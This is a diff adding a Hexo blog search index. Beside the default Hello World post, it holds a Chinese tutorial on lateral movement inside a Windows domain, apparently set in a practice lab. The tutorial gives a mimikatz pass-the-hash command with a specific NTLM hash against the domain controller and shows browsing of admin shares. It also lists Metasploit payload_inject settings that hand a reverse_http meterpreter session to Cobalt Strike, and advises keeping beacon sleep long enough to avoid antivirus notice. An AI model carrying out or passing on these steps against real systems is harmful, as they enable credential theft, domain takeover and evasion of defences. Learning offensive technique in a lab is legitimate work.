@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/12/25/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>内网渗透</title>
+    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
+<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
+<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
+<p>哈希传递工具 必须借助<code>mimikatz</code></p>
+<blockquote>
+<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
+</blockquote>
+<p>通过蚁剑上传到 web目录</p>
+<p>在meterpreter中运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>
+
+<p>运行命令 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>
+
+<p>exit 退出</p>
+<p>我们直接远程执行 域控服务器上的命令</p>
+<p>以下所有的命令是在跳板机上执行。</p>
+<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>
+
+<p>执行第二台机器上的命令</p>
+<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
+<span id="more"></span>
+
+<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>我们打开cs 可以看到主机已经上线</p>
+<p>鼠标右键 —会话交互</p>
+<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
+<p>在最下面 beacon  输入 sleep2  </p>
+<p>输入 help查看命令</p>
+<p>输入命令 抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>
+
+<p>横向移动：</p>
+<p>鼠标右键 网络探测：</p>
+<p>这里我们新建一个监听器,这个后面要用</p>
+<p>运行完成后要等 几秒</p>
+<p>同样的办法横向移动到域控</p>
+]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>导航</tag>
+        <tag>分享</tag>
+      </tags>
+  </entry>
+</search>
